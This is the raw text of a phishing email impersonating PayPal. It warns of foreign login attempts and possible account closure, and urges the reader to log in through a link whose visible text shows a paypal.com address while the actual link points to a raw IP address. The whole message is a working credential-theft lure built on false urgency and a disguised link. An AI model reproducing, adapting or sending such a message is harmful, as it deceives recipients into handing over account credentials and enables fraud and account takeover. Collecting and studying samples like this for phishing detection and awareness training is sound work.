Dear PayPal User,

We recently noticed one or more attempts to log in to your PayPal account
from a foreign IP address. We have temporarily limited access to sensitive=

PayPal account features. Allowing your account access to remain limited fo=
r 
an extended period of time may result in further limitations on the use of=

your account and possible account closure.

If you recently accessed your account while traveling, the unusual log in
attempts may have been initiated by you. However, if you did not initiate
the log ins, please visit PayPal as soon as possible to log in and perform=
 
the steps necessary to restore your account access:

<a href=3D"http://218.150.160.185/tv/pose/ /accounts/id_14465/cgi-bin/logi=
n-run/webscr/www.paypal.com/index.php">https://www.paypal.com/us/cgi-bin/w=
ebscr?cmd=3D_login-run</a>


After filling in the information required we advise you to change your pas=
sword.
Changing your password is a security measure that will ensure that you are=

the only person with access to the account.


Thanks for your patience as we work together to protect your account.

Sincerely,
PayPal
